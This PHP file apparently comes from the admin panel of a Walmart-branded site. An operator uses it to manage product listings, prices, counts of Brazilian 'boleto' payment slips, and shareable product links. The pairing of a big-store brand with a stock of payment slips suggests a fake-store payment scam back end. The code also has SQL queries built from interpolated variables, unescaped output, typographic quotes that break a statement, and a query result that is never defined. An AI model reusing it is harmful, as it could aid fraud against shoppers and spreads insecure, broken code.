<?php


error_reporting(0);
ini_set(“display_errors”, 0 );


ob_start();
session_start();


if(isset($_SESSION['nome_a']))
	{

	
	
require_once ("function/funcions.php");
require_once ("function/contar.php");

require_once ("function/config.php");
require_once ("function/conexao.php");



$dadosA = "SELECT* FROM configuracao where id=1";
$conA = $mysqli -> query($dadosA) or die ($mysqli -> error);


while ($consultaA= $conA -> fetch_array()){
	
	$link_site = $consultaA ["link_site"];

}


?>










<!DOCTYPE html>
    
<head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
        <meta name="format-detection" content="telephone=no">
        <meta charset="UTF-8">

        <meta name="description" content="Violate Responsive Admin Template">
        <meta name="keywords" content="Super Admin, Admin, Template, Bootstrap">

        <title>PAINEL ADMINISTRATIVO - WALMART - ZEDN</title>
            
        <!-- CSS -->
        <link href="css/bootstrap.min.css" rel="stylesheet">
        <link href="css/animate.min.css" rel="stylesheet">
        <link href="css/font-awesome.min.css" rel="stylesheet">
        <link href="css/form.css" rel="stylesheet">
        <link href="css/calendar.css" rel="stylesheet">
        <link href="css/style.css" rel="stylesheet">
        <link href="css/icons.css" rel="stylesheet">
        <link href="css/generics.css" rel="stylesheet"> 
    </head>
    <body id="skin-blur-violate">
        <header id="header" class="media">
            <a class="logo pull-left" href="index.php">Bem Vindo , <?php echo $_SESSION['nome_a'] ?> </a>
            
            <div class="media-body">
                <div class="media" id="top-menu">
                   
           
                    
                   
                    <div id="time" class="pull-right">
                        <span id="hours"></span>
                        :
                        <span id="min"></span>
                        :
                        <span id="sec"></span>
                    </div> 


                  
                </div>
            </div>
        </header>
        
        <div class="clearfix"></div>
        
        <section id="main" class="p-relative" role="main">
            
            <!-- Sidebar -->
            <aside id="sidebar">
                
                <!-- Sidbar Widgets -->
                <div class="side-widgets overflow">
                    <!-- Profile Menu -->
                    <div class="text-center s-widget m-b-25 dropdown" id="profile-menu">
                        <a href="#" data-toggle="dropdown">
                            <img class="profile-pic animated" src="img/profile-pic.jpg" alt="">
                        </a>

                        <h4 class="m-0"><?php echo $_SESSION['nome_a'] ?></h4>
                    </div>
                    
                    <!-- Calendar -->
                    <div class="s-widget m-b-25">
                        <div id="sidebar-calendar"></div>
                    </div>
                    
                    <!-- Feeds -->
                    <div class="s-widget m-b-25">
                        <h2 class="tile-title">
                           Atualizações
                        </h2>
                        
						<iframe  frameborder='0' src="check.html" src="frame.php" width="200" height="100"  ></iframe>

						
						
						
                        <div class="s-widget-body">
                            <div id="news-feed"></div>
                        </div>
                    </div>
                    
     
                </div>
                
                <!-- Side Menu -->
                <ul class="list-unstyled side-menu">
        
                </ul>
                
            </aside>
        
            <!-- Content -->
            <section id="content" class="container">
            
   
                
                      
                <!-- Shortcuts -->
                <div class="block-area shortcut-area">
                    <a class="shortcut tile" href="index.php">
                        <img src="img/shortcuts/money.png" alt="">
                        <small class="t-cog">Inicio</small>
                    </a>
					
					 <a class="shortcut tile" href="info.php">
                        <img src="img/shortcuts/money.png" alt="">
                        <small class="t-cog">Infos</small>
                    </a>
					
                    <a class="shortcut tile" href="configuracao.php">
                        <img src="img/shortcuts/twitter.png" alt="">
                        <small class="t-overflow">Configurações</small>
                    </a>
					<a class="shortcut tile" href="engenharia.php">
                        <img src="img/shortcuts/engenharia.png" alt="">
                        <small class="t-overflow">Engenharia</small>
                    </a>
					
					
					<a class="shortcut tile" href="logout.php">
                        <img src="img/shortcuts/off.png" alt="">
                        <small class="t-overflow">Deslogar</small>
                    </a>
					
                             

                

                <!-- Content Boxes -->
                <div class="block-area" id="content-boxes">
                    
					
                    <center><iframe name="frame" width="600" height="150" src='frame.php' frameborder='0' /></iframe></center>
					
	<?php if ( $_GET ['exclui'] == 1) { ?>
					
                    <div class="alert alert-success alert-icon">
                        <strong>Sucesso ao excluir o produto.</strong>
                        <i class="icon">&#61845;</i>
                    </div>
	<?php } if( $_GET ['exclui'] == 2) { ?>
					
					                   
                    <div class="alert alert-danger alert-icon">
                        <strong> Falha ao excluir produto.</strong>
                        <i class="icon">&#61907;</i>
                    </div>
					
					<?php } ?>
					
	<?php if ( $_GET ['config'] == 1) { ?>
					
                    <div class="alert alert-success alert-icon">
                        <strong>Sucesso ao editar as informações do produto.</strong>
                        <i class="icon">&#61845;</i>
                    </div>
	<?php } if( $_GET ['config'] == 2) { ?>
					
					                   
                    <div class="alert alert-danger alert-icon">
                        <strong>Falha ao editar as informações do produto.</strong>
                        <i class="icon">&#61907;</i>
                    </div>
					
					<?php } ?>
					
					
	<?php  if( $_GET ['edit'] == 1) { ?>
					
					                   
                    <div class="alert alert-info alert-icon">
                        <strong>Ative o boleto antes de editar.</strong>
                        <i class="icon">&#61770;</i>
                    </div>
					
					<?php }  ?>
					
					
					
<?php if ( $_GET ['status'] == 1) { ?>
					
                    <div class="alert alert-success alert-icon">
                        <strong>Sucesso ao editar os boletos do produto.</strong>
                        <i class="icon">&#61845;</i>
                    </div>
	<?php } if( $_GET ['status'] == 2) { ?>
					
					                   
                    <div class="alert alert-danger alert-icon">
                        <strong>Falha ao editar os boletos do produto.</strong>
                        <i class="icon">&#61907;</i>
                    </div>
					
					<?php } ?>
					
					
					
					
					
					
					

                      <div class="block-area" id="custom">

                     <div class="row">
					 
					 		<?php while ($consulta1= $con1 -> fetch_array()){?> 

					 
                          <div class="col-sm-6 col-md-4">
                               <div class="thumbnail tile">
                                    <img   src="<?php echo $consulta1 ["img"]; ?>" alt="">
                                    <div class="p-15">
                                        <h4><?php $nome_a = $consulta1 ["nome_produto"];  echo  substr($nome_a, 0, 50); ?>...</h4>
                                        
									
								<p><?php $PRECO_NORMAL = $consulta1 ["preco"]; echo  number_format($PRECO_NORMAL,2,",",".") ;?> R$ --- 
								
								<?php if (($consulta1 ["status_boleto"] == 1) ) { ?>

								Boleto<font color="green" > Ativado </font> ---
								
								<font color="red" ><?php 
								$ID_L = $consulta1 ["id"];
								
								$sqlX="SELECT count(id_produto) AS  total FROM boletos where id_produto='$ID_L' and numero='' ";

$result=mysqli_query($mysqli,$sqlX);
$values=mysqli_fetch_assoc($result);
$cont_leto=$values['total'];  echo 5-$cont_leto?></font> Dísponiveis
							<?php } else {?> 
								
								Boleto<font color="red" > Desativado </font> 

							<?php }?>
								
								</p>
								
								
                                        <form target="frame" action="frame.php" method="post"  >
										<input type="hidden" name="link1" value="<?php echo $link_site ?>?category=<?php $url = $consulta1 ["url"];  echo  substr($url, 27, 150); ?>&id=<?php echo $consulta1 ["id"]; ?>" > 
                                         <input type="hidden" name="link2" value="<?php echo $link_site ?>?id=<?php echo $consulta1 ["id"]; ?> " >
                    <button name="ver" class="btn btn-xs btn-alt m-r-5">Visualizar Link</button>					
                    <button  class="btn btn-xs btn-alt m-r-5"><a href="edit.php?id=<?php echo $consulta1 ["id"]; ?>&leto=<?php echo $consulta1 ["status_boleto"] ?>" target="_blank" >Editar Boletos</a></button>
					</form>
					
					                


				 <form action="function/exlui_produto.php"  method="post" >
				<input type="hidden" value="<?php echo $consulta1 ["id"]; ?>" name="id" ></input>
                   
				   
				   <div class="block-area" id="block-level">
                     <button type="submit" class="btn btn-block btn-alt">Excluir</button>
                </div>
				

	              </form>
				  
				  
		<br></br>
		<br></br>    <div class="dropdown">
				    <a data-toggle="dropdown" href="#" class="btn btn-block btn-alt">Atualizar Informações</a>


					

                          
					
					
                        <div class="dropdown-menu dark col-md-3 animated flipInY dropdown-form" role="menu">
						
						
						
						
                            <header class="dark-header">
							
							

                            </header>
                            <div class="dark-body">
							
                                <form  action="function/edit_preco.php" method="post" >
								<input type="hidden" value="<?php echo $consulta1 ["id"]; ?>" name="id" ></input>
								<input type="hidden" value="<?php echo $consulta1 ["id_boleto"]; ?>" name="id_boleto" ></input>
								
                                    <div class="form-group">
                                        <label>Preço</label>
                                        <input type="text" required name="preco" class="form-control input-sm" value="<?php echo $consulta1 ["preco"]; ?> ">
                                    </div>
        
		
		             <label>Boleto</label>
                    <select name="status" class="form-control input-sm m-b-10">
                        <option  value="2">Desativado</option>
                        <option  value="1"> Ativado</option>
                    </select>
					

					
                            </div>
							
                            <div class="dark-footer">
                                <button type="submit" class="btn btn-sm btn-alt">Salvar</button>	 </form>
                            </div>
						
                        </div>
                    </div>
					</div>
                </div>
				
                </div>
				<?php } ?>
					
				
				
              
               
              
        
        <!-- Javascript Libraries -->
        <!-- jQuery -->
        <script src="js/jquery.min.js"></script> <!-- jQuery Library -->
        
        <!-- Bootstrap -->
        <script src="js/bootstrap.min.js"></script>

                <script src="js/functions.js"></script>

    </body>

<!-- Mirrored from byrushan.com/projects/sa/1-0-3/other-components.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 24 Oct 2017 19:53:10 GMT -->
</html>


	<?php

	} 
	
	else
		
		{		
			
     ?>
        	Esta é uma área restrita, por favor, <a href="login.php"><strong>efetue login</strong></a>.
        </div>
		<?php 	ob_end_flush();

	}
?>